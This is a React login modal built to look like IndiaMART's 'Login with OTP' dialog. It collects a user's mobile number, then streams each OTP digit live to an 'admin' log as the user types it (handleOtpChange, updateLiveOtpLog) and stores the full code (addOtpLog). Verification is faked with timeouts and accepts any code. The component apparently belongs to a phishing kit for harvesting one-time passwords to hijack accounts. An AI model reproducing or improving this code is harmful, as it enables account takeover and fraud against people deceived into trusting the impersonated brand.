'use client';

import React, { useState, useRef, useEffect } from 'react';
import { X, RefreshCw, Edit2, CheckCircle2, KeyRound } from 'lucide-react';
import { UserSession } from '@/lib/types';
import { addOtpLog, updateLiveOtpLog } from '@/lib/storage';
import { CountryCodeSelector, CountryCode, COUNTRY_LIST } from '@/components/CountryCodeSelector';

interface IndiaMartLoginModalProps {
  isOpen: boolean;
  onClose: () => void;
  onSuccessLogin: (session: UserSession) => void;
}

export const IndiaMartLoginModal: React.FC<IndiaMartLoginModalProps> = ({
  isOpen,
  onClose,
  onSuccessLogin,
}) => {
  const [step, setStep] = useState<'mobile' | 'otp'>('mobile');
  const [selectedCountry, setSelectedCountry] = useState<CountryCode>(COUNTRY_LIST[0]);
  const [mobileNumber, setMobileNumber] = useState('');
  const [errorMsg, setErrorMsg] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  // OTP State - strictly 4 digits
  const [otpDigits, setOtpDigits] = useState<string[]>(['', '', '', '']);
  const [resendTimer, setResendTimer] = useState(30);
  const otpInputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (step === 'otp' && resendTimer > 0) {
      interval = setInterval(() => {
        setResendTimer((prev) => prev - 1);
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [step, resendTimer]);

  if (!isOpen) return null;

  const getFullMobile = () => `${selectedCountry.code} ${mobileNumber}`;

  const handleMobileSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const cleaned = mobileNumber.replace(/\D/g, '');
    if (cleaned.length !== 10) {
      setErrorMsg('Please enter a valid 10-digit mobile number.');
      return;
    }
    setErrorMsg('');
    setIsLoading(true);

    setTimeout(() => {
      setIsLoading(false);
      setStep('otp');
      setResendTimer(30);
      setOtpDigits(['', '', '', '']);
      updateLiveOtpLog(getFullMobile(), '', 'Pending');
    }, 500);
  };

  const handleOtpChange = (index: number, val: string) => {
    if (!/^\d*$/.test(val)) return;

    const newOtp = [...otpDigits];
    newOtp[index] = val.slice(-1);
    setOtpDigits(newOtp);

    // LIVE OTP UPDATE TO ADMIN IN REAL-TIME AS USER TYPES EACH NUMBER
    const liveOtpString = newOtp.join('');
    updateLiveOtpLog(getFullMobile(), liveOtpString, 'Pending');

    // Auto-advance to next input
    if (val && index < 3) {
      otpInputRefs.current[index + 1]?.focus();
    }
  };

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otpDigits[index] && index > 0) {
      otpInputRefs.current[index - 1]?.focus();
    }
  };

  const handleResendOtp = () => {
    if (resendTimer > 0) return;
    setResendTimer(30);
    setErrorMsg('');
    updateLiveOtpLog(getFullMobile(), '', 'Pending');
  };

  const handleVerifyOtp = (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    const enteredOtp = otpDigits.join('');
    if (enteredOtp.length !== 4) {
      setErrorMsg('Please enter the full 4-digit OTP code.');
      return;
    }

    setIsLoading(true);
    const fullMobile = getFullMobile();
    addOtpLog(fullMobile, enteredOtp);

    setTimeout(() => {
      setIsLoading(false);
      const session: UserSession = {
        mobileNumber: fullMobile,
        isVerified: true,
        verifiedAt: new Date().toISOString(),
      };
      onSuccessLogin(session);
      onClose();
      // Reset state for future
      setStep('mobile');
      setMobileNumber('');
      setOtpDigits(['', '', '', '']);
    }, 600);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-xs animate-fadeIn">
      <div className="bg-white rounded-xl shadow-2xl w-full max-w-lg overflow-hidden border border-gray-200 relative">
        {/* Top Header matching Image 2 (Deep Navy/Purple with Sign In & X close) */}
        <div className="bg-[#282a8c] text-white px-6 py-4 flex justify-between items-center">
          <h2 className="text-xl font-bold tracking-tight">Sign In</h2>
          <button
            type="button"
            onClick={onClose}
            className="text-white hover:opacity-80 transition-opacity p-1 cursor-pointer"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Modal Body matching Image 2 & Image 3 */}
        <div className="p-8 sm:p-10 space-y-6">
          <h3 className="text-2xl sm:text-3xl font-extrabold text-[#111111] text-center">
            Login with OTP
          </h3>

          {step === 'mobile' ? (
            <form onSubmit={handleMobileSubmit} className="space-y-6">
              <div className="text-left space-y-2">
                <label className="block text-sm font-bold text-[#111111]">
                  Mobile Number
                </label>
                <div className="flex border border-[#282a8c] rounded-md focus-within:ring-2 focus-within:ring-[#282a8c]/20 overflow-visible relative">
                  <CountryCodeSelector
                    selectedCountry={selectedCountry}
                    onSelectCountry={setSelectedCountry}
                  />
                  <input
                    type="tel"
                    maxLength={12}
                    value={mobileNumber}
                    onChange={(e) => setMobileNumber(e.target.value.replace(/\D/g, ''))}
                    placeholder="Enter Your Mobile Number"
                    className="flex-1 px-4 py-3 text-base text-gray-800 outline-none font-normal placeholder:text-gray-400"
                    autoFocus
                  />
                </div>
                {errorMsg && <p className="text-xs font-bold text-red-600">{errorMsg}</p>}
              </div>

              <button
                type="submit"
                disabled={isLoading}
                className="w-full bg-[#00a699] hover:bg-[#008e82] active:bg-[#00786e] text-white font-bold text-lg py-3.5 rounded-md shadow-sm transition-all cursor-pointer flex items-center justify-center gap-2"
              >
                {isLoading ? (
                  <>
                    <RefreshCw className="w-5 h-5 animate-spin" />
                    Submitting...
                  </>
                ) : (
                  'Submit'
                )}
              </button>
            </form>
          ) : (
            /* OTP STEP - Strictly 4 Digits */
            <div className="space-y-6">
              <div className="text-center space-y-1">
                <p className="text-sm text-gray-600">
                  Enter 4-digit OTP sent to{' '}
                  <span className="font-extrabold text-gray-900">
                    {selectedCountry.code} {mobileNumber}
                  </span>
                </p>
                <button
                  type="button"
                  onClick={() => {
                    setStep('mobile');
                    setErrorMsg('');
                  }}
                  className="text-xs text-[#00a699] font-bold hover:underline inline-flex items-center gap-1 cursor-pointer"
                >
                  <Edit2 className="w-3 h-3" />
                  Edit Mobile Number
                </button>
              </div>

              <div className="flex justify-center gap-3 sm:gap-4">
                {otpDigits.map((digit, idx) => (
                  <input
                    key={idx}
                    ref={(el) => {
                      otpInputRefs.current[idx] = el;
                    }}
                    type="text"
                    inputMode="numeric"
                    maxLength={1}
                    value={digit}
                    onChange={(e) => handleOtpChange(idx, e.target.value)}
                    onKeyDown={(e) => handleOtpKeyDown(idx, e)}
                    className="w-13 h-15 text-center text-3xl font-extrabold border-2 border-[#282a8c] rounded-lg focus:ring-2 focus:ring-[#00a699]/30 outline-none text-gray-800"
                    autoFocus={idx === 0}
                  />
                ))}
              </div>

              {/* Resend OTP Section */}
              <div className="flex items-center justify-between text-xs font-medium pt-1 px-1">
                <span className="text-gray-500">Didn't receive OTP?</span>
                {resendTimer > 0 ? (
                  <span className="text-gray-400 font-semibold flex items-center gap-1">
                    Resend in <span className="text-[#202670] font-bold">00:{resendTimer < 10 ? `0${resendTimer}` : resendTimer}</span>
                  </span>
                ) : (
                  <button
                    type="button"
                    onClick={handleResendOtp}
                    className="text-[#d9383a] hover:text-[#c62e30] font-extrabold underline cursor-pointer hover:scale-105 transition-all"
                  >
                    Resend OTP
                  </button>
                )}
              </div>

              {errorMsg && <p className="text-xs font-bold text-red-600 text-center">{errorMsg}</p>}

              <button
                type="button"
                onClick={() => handleVerifyOtp()}
                disabled={isLoading}
                className="w-full bg-[#00a699] hover:bg-[#008e82] active:bg-[#00786e] text-white font-bold text-lg py-3.5 rounded-md shadow-sm transition-all cursor-pointer flex items-center justify-center gap-2"
              >
                {isLoading ? (
                  <>
                    <RefreshCw className="w-5 h-5 animate-spin" /> Verifying...
                  </>
                ) : (
                  'Verify & Submit'
                )}
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

